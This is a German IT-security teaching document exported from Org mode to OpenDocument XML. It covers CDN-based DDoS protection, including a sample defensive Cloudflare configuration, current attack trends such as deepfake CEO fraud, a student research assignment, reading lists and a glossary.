</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Red-Team-Übungen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Bug-Bounty-Programme
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"Red-Team-Übungen"sind simulierte Angriffe durch ein Team von Sicherheitsexperten,die versuchen,die Verteidigungsmaßnahmen einer Organisation zu überwinden,um Schwachstellen zu identifizieren.
</text:p>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org36014b5"/>
<text:bookmark text:name="org36014b5"/>Content Delivery Networks (CDN) als Schutzmaßnahme
<text:bookmark-end text:name="OrgXref.org36014b5"/></text:h>
      <text:p text:style-name="Text_20_body">Content Delivery Networks sind verteilte Netzwerke von Servern,die Website-Inhalte an verschiedenen geografischen Standorten zwischenspeichern und ausliefern.
</text:p>
      <text:p text:style-name="Text_20_body">"CDN"steht für "Content Delivery Network"und bezeichnet ein Netzwerk geografisch verteilter Server,die zusammenarbeiten,um digitale Inhalte schnell und zuverlässig bereitzustellen.Ursprünglich zur Leistungsverbesserung entwickelt,haben CDNs heute wichtige Sicherheitsfunktionen.
</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgdfab3f5"/>
<text:bookmark text:name="orgdfab3f5"/>Funktionsweise eines CDN
<text:bookmark-end text:name="OrgXref.orgdfab3f5"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verteilung von Inhalten auf mehrere Server weltweit
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Auslieferung von Inhalten vom geografisch nächsten Server
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Zwischenspeicherung (Caching) statischer Inhalte
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Lastverteilung zwischen Servern
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Netzwerkoptimierung durch effiziente Routing-Mechanismen
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orga38920a"/>
<text:bookmark text:name="orga38920a"/>CDN als DDoS-Schutz
<text:bookmark-end text:name="OrgXref.orga38920a"/></text:h>
      <text:p text:style-name="Text_20_body">CDNs bieten mehrere Schutzmechanismen gegen DDoS-Angriffe:
</text:p>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgc5187ca"/>
<text:bookmark text:name="orgc5187ca"/>Angriffsverdünnung durch Verteilung
<text:bookmark-end text:name="OrgXref.orgc5187ca"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verteilung des Datenverkehrs auf zahlreiche Server weltweit
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Einzelne Server werden nicht überlastet
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Angriffsdaten werden über ein größeres Netzwerk verteilt
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org65fbfe1"/>
<text:bookmark text:name="org65fbfe1"/>Traffic-Filterung und Anomalieerkennung
<text:bookmark-end text:name="OrgXref.org65fbfe1"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Erkennung ungewöhnlicher Verkehrsmuster in Echtzeit
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Unterscheidung zwischen legitimen Benutzern und Angreifern
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Automatische Blockierung verdächtiger IP-Adressen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Layer 3/4 und Layer 7 Schutz (Netzwerk- und Anwendungsebene)
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org1003734"/>
<text:bookmark text:name="org1003734"/>Überkapazität und Skalierung
<text:bookmark-end text:name="OrgXref.org1003734"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">CDNs verfügen über massive Bandbreitenreserven
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Können plötzliche Verkehrsspitzen absorbieren
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Dynamische Skalierung bei Bedarf
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orged33cf9"/>
<text:bookmark text:name="orged33cf9"/>Bot-Management
<text:bookmark-end text:name="OrgXref.orged33cf9"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Identifizierung und Blockierung von Bot-Netzwerken
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">CAPTCHA-Integration für verdächtige Anfragen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Rate-Limiting für einzelne IP-Adressen
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orga697f45"/>
<text:bookmark text:name="orga697f45"/>Beispiel:CDN-Konfiguration mit Cloudflare
<text:bookmark-end text:name="OrgXref.orga697f45"/></text:h>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/># Beispiel einer Cloudflare-Konfiguration (als .cloudflare.yaml)</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/></text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/># DDoS-Schutzeinstellungen</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/>ddos_protection:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>security_level: high <text:s text:c="5"/># Sicherheitsstufe (low, medium, high)</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>challenge_ttl: 3600 <text:s text:c="6"/># Gültigkeitsdauer von Sicherheitsabfragen in Sekunden</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>rate_limiting:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="5"/>enabled: true</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="5"/>threshold: 100 <text:s text:c="9"/># Maximale Anfragen pro Minute</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="5"/>action: challenge <text:s text:c="6"/># Aktion bei Überschreitung (challenge, block, js_challenge)</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/></text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/># WAF (Web Application Firewall) Regeln</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/>waf:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>enabled: true</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>ruleset: cloudflare <text:s text:c="5"/># Verwendetes Regelset</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>custom_rules:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="5"/>- description: "Blockiere verdächtige User-Agents"</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="7"/>expression: "http.user_agent contains 'scraper' or http.user_agent contains 'bot'"</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="7"/>action: block</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/></text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/># Caching-Einstellungen</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="1"/>cache:</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>enabled: true</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"> <text:s text:c="3"/>ttl: 86400 <text:s text:c="14"/># Caching-Dauer in Sekunden (24 Stunden)</text:p>
      <text:p text:style-name="OrgFixedWidthBlockLastLine"> <text:s text:c="3"/>browser_ttl: 14400 <text:s text:c="6"/># Browser-Cache-Dauer (4 Stunden)</text:p>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org39e9b5f"/>
<text:bookmark text:name="org39e9b5f"/>Vor- und Nachteile von CDNs
<text:bookmark-end text:name="OrgXref.org39e9b5f"/></text:h>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org1287fc4"/>
<text:bookmark text:name="org1287fc4"/>Vorteile
<text:bookmark-end text:name="OrgXref.org1287fc4"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Effektiver Schutz gegen volumetrische DDoS-Angriffe
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verbesserung der Website-Ladezeiten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Reduzierung der Last auf Ursprungsservern
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Globale Verteilung für Ausfallsicherheit
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4_unnumbered" text:outline-level="4" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgdab0a7f"/>
<text:bookmark text:name="orgdab0a7f"/>Nachteile
<text:bookmark-end text:name="OrgXref.orgdab0a7f"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Potenzielle Abhängigkeit von einem externen Dienstleister
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Mögliche Komplexität bei der Konfiguration
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Zusätzliche Kosten bei hohem Datenverkehr
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Bei unsachgemäßer Konfiguration mögliche Datenschutzprobleme
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org793ae90"/>
<text:bookmark text:name="org793ae90"/>Einsatzstrategien für CDNs
<text:bookmark-end text:name="OrgXref.org793ae90"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Kombination mit lokalen Schutzmaßnahmen (Defense-in-Depth)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Absicherung kritischer Webanwendungen und APIs
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Entwicklung von Notfallplänen für den Fall einer CDN-Störung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Regelmäßige Überprüfung und Anpassung der CDN-Konfiguration
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Die Nutzung eines CDN ist eine proaktive Maßnahme,die sowohl die Leistung als auch die Sicherheit einer Website verbessert.Als Teil einer umfassenden Sicherheitsstrategie sollte ein CDN mit anderen Sicherheitsmaßnahmen wie Firewalls,Intrusion Detection und regelmäßigen Sicherheitsaudits kombiniert werden.
</text:p>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org1cf6540"/>
<text:bookmark text:name="org1cf6540"/>Aktuelle Angriffsszenarien (2024-2025)
<text:bookmark-end text:name="OrgXref.org1cf6540"/></text:h>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org5defca5"/>
<text:bookmark text:name="org5defca5"/>Erweiterte Phishing-Techniken
<text:bookmark-end text:name="OrgXref.org5defca5"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">KI-generierte Phishing-Nachrichten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Gezielte Spear-Phishing-Angriffe mit präzisen persönlichen Informationen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Manipulation von Geschäftskommunikation (Business Email Compromise)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Mehrsprachige und kulturell angepasste Phishing-Kampagnen
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgbc9e1dd"/>
<text:bookmark text:name="orgbc9e1dd"/>Cloud-Sicherheitsbedrohungen
<text:bookmark-end text:name="OrgXref.orgbc9e1dd"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Fehlkonfigurationen in Cloud-Umgebungen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Angriffe auf APIs
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Container-Sicherheitslücken
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Identity and Access Management (IAM) Schwachstellen
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org7321a84"/>
<text:bookmark text:name="org7321a84"/>Angriffe auf Lieferketten
<text:bookmark-end text:name="OrgXref.org7321a84"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Kompromittierung von Software-Lieferketten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Angriffe auf vertrauenswürdige Software-Updates
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Manipulation von Open-Source-Paketen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Kompromittierung von Entwicklungsumgebungen
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"Lieferkettenangriffe"zielen auf die Kompromittierung von Software oder Hardware während des Entwicklungs- oder Verteilungsprozesses ab,oft bevor sie den Endverbraucher erreicht.
</text:p>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgdb9fe8e"/>
<text:bookmark text:name="orgdb9fe8e"/>IoT-Bedrohungen
<text:bookmark-end text:name="OrgXref.orgdb9fe8e"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Angriffe auf unzureichend gesicherte IoT-Geräte
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Botnets aus kompromittierten IoT-Geräten
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Smart-Home-Schwachstellen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Industrielle IoT-Sicherheitsprobleme
</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">"IoT"(Internet of Things) bezeichnet Alltagsgeräte,die mit dem Internet verbunden sind und Daten sammeln,austauschen und verarbeiten können.
</text:p>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orge007ea7"/>
<text:bookmark text:name="orge007ea7"/>Deepfakes und KI-gestützte Angriffe
<text:bookmark-end text:name="OrgXref.orge007ea7"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Täuschend echte Stimm- und Videomanipulationen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Automatisierte Social-Engineering-Angriffe
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Umgehung von biometrischen Sicherheitssystemen
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Generative KI zur Erstellung täuschend echter Phishing-Inhalte
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3_unnumbered" text:outline-level="3" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orge700eb2"/>
<text:bookmark text:name="orge700eb2"/>Beispiel:Deepfake-basierte CEO-Betrugsmasche
<text:bookmark-end text:name="OrgXref.orge700eb2"/></text:h>
      <text:p text:style-name="OrgFixedWidthBlock">Ein Finanzmanager erhält einen Videoanruf, der scheinbar vom CEO des Unternehmens kommt. </text:p>
      <text:p text:style-name="OrgFixedWidthBlock">Die Person sieht aus und klingt genau wie der CEO, ist jedoch ein Deepfake.</text:p>
      <text:p text:style-name="OrgFixedWidthBlock"/>
      <text:p text:style-name="OrgFixedWidthBlock">Der falsche CEO erklärt, dass eine dringende, vertrauliche Übernahme im Gange sei und </text:p>
      <text:p text:style-name="OrgFixedWidthBlock">sofort eine Vorauszahlung an ein Treuhandkonto geleistet werden müsse. </text:p>
      <text:p text:style-name="OrgFixedWidthBlock">Er betont die Dringlichkeit und Vertraulichkeit, um den normalen Genehmigungsprozess </text:p>
      <text:p text:style-name="OrgFixedWidthBlockLastLine">zu umgehen.</text:p>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org0162613"/>
<text:bookmark text:name="org0162613"/>Praxisaufgabe:Recherche aktueller Angriffsszenarien
<text:bookmark-end text:name="OrgXref.org0162613"/></text:h>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org0758f01"/>
<text:bookmark text:name="org0758f01"/>Aufgabenstellung
<text:bookmark-end text:name="OrgXref.org0758f01"/></text:h>
      <text:list text:style-name="OrgNumberedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Recherchieren Sie ein aktuelles Angriffsszenario aus den Jahren 2024-2025
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Analysieren Sie:
</text:p>
          <text:list text:style-name="OrgBulletedList" text:continue-numbering="true">
            <text:list-item>
              <text:p text:style-name="Text_20_body">Art des Angriffs
</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="Text_20_body">Betroffene Systeme und Organisationen
</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="Text_20_body">Angriffsmethode und -verlauf
</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="Text_20_body">Auswirkungen und Schäden
</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="Text_20_body">Gegenmaßnahmen und Lehren
</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Erstellen Sie eine Präsentation (10-15 Minuten)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Bereiten Sie praktische Empfehlungen vor,wie sich Unternehmen vor ähnlichen Angriffen schützen können
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org9d601d6"/>
<text:bookmark text:name="org9d601d6"/>Bewertungskriterien
<text:bookmark-end text:name="OrgXref.org9d601d6"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Tiefe und Qualität der Recherche (10 Punkte)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Verständnis der technischen Details (5 Punkte)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Qualität der Präsentation (5 Punkte)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Praxisrelevanz der Empfehlungen (5 Punkte)
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org773523b"/>
<text:bookmark text:name="org773523b"/>Literatur und weiterführende Ressourcen
<text:bookmark-end text:name="OrgXref.org773523b"/></text:h>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org2760cad"/>
<text:bookmark text:name="org2760cad"/>Bücher
<text:bookmark-end text:name="OrgXref.org2760cad"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Ross J.Anderson:"Security Engineering"(3.Auflage,2020)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Kim Zetter:"Countdown to Zero Day"(2015)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Bruce Schneier:"Click Here to Kill Everybody"(2018)
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org9ff458e"/>
<text:bookmark text:name="org9ff458e"/>Online-Ressourcen
<text:bookmark-end text:name="OrgXref.org9ff458e"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">OWASP Top 10: <text:a xlink:type="simple" xlink:href="https://owasp.org/Top10/">https://owasp.org/Top10/</text:a>
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">NIST Cybersecurity Framework: <text:a xlink:type="simple" xlink:href="https://www.nist.gov/cyberframework">https://www.nist.gov/cyberframework</text:a>
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">BSI IT-Grundschutz: <text:a xlink:type="simple" xlink:href="https://www.bsi.bund.de/grundschutz">https://www.bsi.bund.de/grundschutz</text:a>
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2_unnumbered" text:outline-level="2" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.org90c07c2"/>
<text:bookmark text:name="org90c07c2"/>Podcasts und Blogs
<text:bookmark-end text:name="OrgXref.org90c07c2"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body">Darknet Diaries (Podcast)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Passwort Podcast von Heise (Podcast)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Risky Buisness (Podcast)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">Krebs on Security (Blog)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">The Hacker News (Website)
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body">heise Security (deutschsprachiges Portal)
</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_1_unnumbered" text:outline-level="1" text:is-list-header="true">
<text:bookmark-start text:name="OrgXref.orgb847718"/>
<text:bookmark text:name="orgb847718"/>Glossar
<text:bookmark-end text:name="OrgXref.orgb847718"/></text:h>
      <text:list text:style-name="OrgBulletedList" text:continue-numbering="false">
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">APT (Advanced Persistent Threat)</text:span>:Komplexe,langfristige Angriffe,oft staatlich gesponsert
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">CVE (Common Vulnerabilities and Exposures)</text:span>:Standardisierte Kennungen für bekannte Sicherheitslücken
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Exploit</text:span>:Code oder Technik zur Ausnutzung einer Sicherheitslücke
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Hashing</text:span>:Kryptografische Einwegfunktion zur Datenintegritätsprüfung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">MITM (Man-in-the-Middle)</text:span>:Angriff,bei dem Kommunikation abgefangen wird
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Pen-Test (Penetrationstest)</text:span>:Autorisierter Simulationsangriff zur Sicherheitsprüfung
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Sandbox</text:span>:Isolierte Umgebung zum Testen potenziell gefährlicher Software
</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="Text_20_body"><text:span text:style-name="Bold">Zero-Day</text:span>:Unbekannte Sicherheitslücke ohne verfügbaren Patch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ShEscapedNewline" style:family="text">
      <style:text-properties fo:color="#79a8ff"/>
    </style:style>
    <style:style style:name="OrgSrcFontLockStringFace" style:family="text">
      <style:text-properties fo:color="#79a8ff"/>
    </style:style>
    <style:style style:name="OrgSrcFontLockFunctionNameFace" style:family="text">
      <style:text-properties fo:color="#feacd0"/>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CommentFace" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="OrgSrcFontLockCommentDelimiterFace" style:family="text">
      <style:text-properties fo:color="#ff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ITT-Net-IS</dc:creator>
    <meta:initial-creator>ITT-Net-IS</meta:initial-creator>
    <dc:date>2025-04-03T19:46:20</dc:date>
    <meta:creation-date>2025-04-03T19:46:20</meta:creation-date>
    <meta:generator>Emacs 29.4 (Org mode 9.6.15)</meta:generator>
    <meta:keyword/>
    <dc:subject/>
    <dc:title>Hackerangriffe und Schutzmaßnahmen</dc:title>
    <meta:user-defined meta:name="subtitle">IT-Sicherheit</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>